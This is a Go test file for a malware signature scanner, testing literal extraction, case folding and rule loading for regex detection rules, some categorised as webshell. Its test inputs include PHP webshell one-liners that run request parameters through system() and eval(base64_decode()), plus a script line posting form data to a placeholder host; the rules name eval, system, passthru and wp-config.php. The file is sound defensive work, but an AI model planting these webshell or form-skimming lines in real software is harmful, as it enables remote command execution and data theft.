package signatures

import (
	"os"
	"path/filepath"
	"reflect"
	"regexp"
	"sort"
	"testing"
)

func TestGateForExtractsRequiredLiterals(t *testing.T) {
	tests := []struct {
		name string
		src  string
		want []string
	}{
		{"single literal", `(?i)eval\s*\(`, []string{"eval"}},
		{"alternation keeps every branch", `(?i)(?:system|passthru)\s*\(`, []string{"passthru", "system"}},
		{"longest literal of a concatenation", `(?i)foo(?:bar)?bazqux`, []string{"bazqux"}},
		{"required repeat keeps its literal", `(?i)(?:abcd){2,}`, []string{"abcd"}},
		{"optional repeat gives no literal", `(?i)(?:abcd){0,3}`, nil},
		{"star gives no literal", `(?i)(?:abcd)*`, nil},
		{"character class gives no literal", `(?i)[a-z]+`, nil},
		{"branch without a literal voids the alternation", `(?i)(?:system|[0-9]+)`, nil},
		{"one-byte branch is too weak to gate", `(?i)(?:system|=)`, nil},
		{"case-sensitive literal is folded", `(?i)(?-i:ABCD)`, []string{"abcd"}},
		{"non-ASCII rune splits a literal", `(?i)caf\x{e9}teria`, []string{"teria"}},
		{"folded long s is the letter s", `(?i)\x{17f}ystem`, []string{"system"}},
		{"case-sensitive long s splits a literal", `(?i)(?-i:\x{17f}ystem)`, []string{"ystem"}},
		{"capture group is transparent", `(?i)(base64_decode)\s*\(`, []string{"base64_decode"}},
		{"escaped metacharacters are literal", `(?i)wp-config\.php`, []string{"wp-config.php"}},
		{"empty-width assertions are ignored", `(?i)\beval\b`, []string{"eval"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := []string(gateFor(tt.src))
			sort.Strings(got)
			if len(got) == 0 {
				got = nil
			}
			if !reflect.DeepEqual(got, tt.want) {
				t.Fatalf("gateFor(%q) = %q, want %q", tt.src, got, tt.want)
			}
		})
	}
}

func TestFoldForGate(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{"ASCII upper case folds", "EvAl(", "eval("},
		{"long s folds to s", "ſyſtem", "system"},
		{"Kelvin sign folds to k", "Key", "key"},
		{"other non-ASCII runes are kept", "café Ä", "café Ä"},
		{"invalid byte keeps decoding in step", "\xe2\xc5\xbf", "\xe2s"},
		{"truncated sequence is kept", "ab\xe2\x84", "ab\xe2\x84"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := foldForGate([]byte(tt.in)); got != tt.want {
				t.Fatalf("foldForGate(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

func TestGateAdmits(t *testing.T) {
	gate := regexGate{"assert", "eval"}
	seen := map[string]bool{}
	if !gate.admits("<?php assert($x);", seen) {
		t.Fatal("gate rejected content holding one of its literals")
	}
	if gate.admits("<?php echo 1;", map[string]bool{}) {
		t.Fatal("gate admitted content holding none of its literals")
	}
	if !regexGate(nil).admits("anything", map[string]bool{}) {
		t.Fatal("an empty gate must admit every input")
	}
}

var regexGateSoundnessCases = []struct {
	name    string
	src     string
	content string
	want    bool
}{
	{"zero repeat", `(?i)^(?:system){0}$`, "", true},
	{"optional repeat absent", `(?i)^(?:system){0,2}$`, "", true},
	{"optional repeat at maximum", `(?i)^(?:system){0,2}$`, "SYSTEMsystem", true},
	{"required repeat at minimum", `(?i)^(?:system){1,3}$`, "system", true},
	{"required repeat at maximum", `(?i)^(?:system){1,3}$`, "systemSYSTEM\u017fy\u017ftem", true},
	{"required repeat beyond maximum", `(?i)^(?:system){1,3}$`, "systemsystemsystemsystem", false},
	{"repeat of nullable operand", `(?i)^(?:(?:system)?){2,3}$`, "", true},
	{"plus of nullable operand", `(?i)^(?:(?:system)?)+$`, "", true},
	{"nested alternative without literal", `(?i)^(?:system|(?:key|[0-9]+))$`, "123", true},
	{"nested empty alternative", `(?i)^(?:system|(?:key|))$`, "", true},
	{"empty alternative before required literal", `(?i)^(?:system|)key$`, "\u212Aey", true},
	{"empty expression", `(?i)`, "", true},
	{"empty group", `(?i)^(?:)$`, "", true},
	{"empty alternative with assertion", `(?i)^(?:system|\b)$`, "", false},
	{"nested required alternatives", `(?i)^(?:system|(?:key|eval)){1,2}$`, "\u212AeyEVAL", true},
	{"scoped case flags", `(?i)^(?-i:AB)(?i:cd)$`, "ABcD", true},
	{"scoped case flags reject wrong case", `(?i)^(?-i:AB)(?i:cd)$`, "abCD", false},
	{"flags in alternate branch", `(?i)^(?:(?-i:AB)|system)$`, "\u017fy\u017ftem", true},
	{"unscoped flags within group", `(?i)^(?:foo(?-i)BAR)baz$`, "FOOBARbaz", true},
	{"case sensitive long s", `(?i)^(?-i:\x{17f}ystem)$`, "\u017fystem", true},
	{"folded literal and content", `(?i)^\x{17f}y\x{17f}tem\x{212a}ey$`, "SYSTEMkey", true},
	{"folded character class", `(?i)^[s]y[s]tem$`, "\u017fy\u017ftem", true},
	{"invalid UTF-8 before literal", `(?i)^\x{fffd}system$`, "\xffSYSTEM", true},
	{"non-ASCII rune between ASCII runs", `(?i)^ab\x{e9}cd$`, "AB\u00c9CD", true},
}

// Every positive case is a known match, so soundness cannot pass merely
// because none of the test inputs exercises the regex branch in question.
func TestRegexEvalMatchesRegexpOnSyntaxEdges(t *testing.T) {
	for _, tt := range regexGateSoundnessCases {
		t.Run(tt.name, func(t *testing.T) {
			cr := &compiledRegex{Regexp: regexp.MustCompile(tt.src), gate: gateFor(tt.src)}
			content := []byte(tt.content)
			if got := cr.Match(content); got != tt.want {
				t.Fatalf("invalid witness: regexp match = %t, want %t", got, tt.want)
			}
			eval := newRegexEval(content)
			for attempt := range 2 {
				if got := eval.match(cr); got != tt.want {
					t.Fatalf("attempt %d: gated match = %t, want %t (gate %q)", attempt, got, tt.want, cr.gate)
				}
			}
		})
	}
}

// A gate must never reject content its regex matches. The inputs below
// reach the regexes through the case-folding paths most likely to be
// missed: mixed case, the long s and the Kelvin sign.
func TestGateIsSoundOnFoldVariants(t *testing.T) {
	inputs := []string{
		"<?php ſyſtem($_GET['c']);",
		"<?php EVAL(base64_decode($_POST['x']));",
		"<?php $Key = 'x'; eval($_REQUEST[1]);",
		"<script>fetch('https://example.invalid/x', {method:'POST', body: new FormData(f)})</script>",
	}
	for _, src := range []string{`(?i)system\s*\(`, `(?i)key\s*=`, `(?i)eval\s*\(\s*base64_decode`} {
		re := regexp.MustCompile(src)
		gate := gateFor(src)
		for _, in := range inputs {
			if re.MatchString(in) && !gate.admits(foldForGate([]byte(in)), map[string]bool{}) {
				t.Fatalf("gate %q rejected %q, which %s matches", gate, in, src)
			}
		}
	}
}

func TestReloadSharesIdenticalRegexes(t *testing.T) {
	dir := t.TempDir()
	writeRuleFile(t, dir, "shared.yml", `version: 1
rules:
  - name: first
    severity: high
    category: webshell
    regexes: ['eval\s*\(']
  - name: second
    severity: high
    category: webshell
    regexes: ['eval\s*\(', 'assert\s*\(']
`)
	s := NewScanner(dir)
	if err := s.LoadError(); err != nil {
		t.Fatal(err)
	}
	first, second := s.rules[0], s.rules[1]
	if first.compiledRegexes[0] != second.compiledRegexes[0] {
		t.Fatal("identical regexes in two rules were compiled separately")
	}
	if second.compiledRegexes[0] == second.compiledRegexes[1] {
		t.Fatal("distinct regexes were merged")
	}
}

func writeRuleFile(t *testing.T, dir, name, body string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
}
